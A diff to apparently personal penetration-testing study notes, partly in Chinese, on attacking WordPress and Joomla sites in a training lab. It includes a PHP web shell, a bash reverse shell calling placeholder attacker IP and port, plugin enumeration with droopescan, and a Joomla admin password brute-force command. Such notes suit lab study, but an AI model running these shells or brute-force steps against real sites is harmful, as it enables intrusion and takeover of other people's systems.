@@ -20,7 +20,7 @@ Sample box:
 
 
 WordPress:
-  curl ... | grep 'WordPress' 'themes' 'plugins
+  curl ... | grep WordPress  themes  plugins
 
   wp-login.php      登录后端
 
@@ -32,3 +32,24 @@ WordPress:
 
   system($_GET[0]);
   ?0=whoami
+
+  尝试plugin漏洞，直接curl
+
+  exec("/bin/bash -c 'bash -i >& /dev/tcp/PWNIP/PWNPO 0>&1'");
+    >&      标准输出和错误指向ah
+    0>&1    标准输入来自ah
+
+  https://github.com/SamJoan/droopescan
+    枚举插件
+
+
+Joomla:
+  https://www.joomla.org/
+
+  curl -s http://dev.inlanefreight.local/ | grep Joomla
+
+  droopescan scan joomla --url http://dev.inlanefreight.local/
+
+  sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
+
+
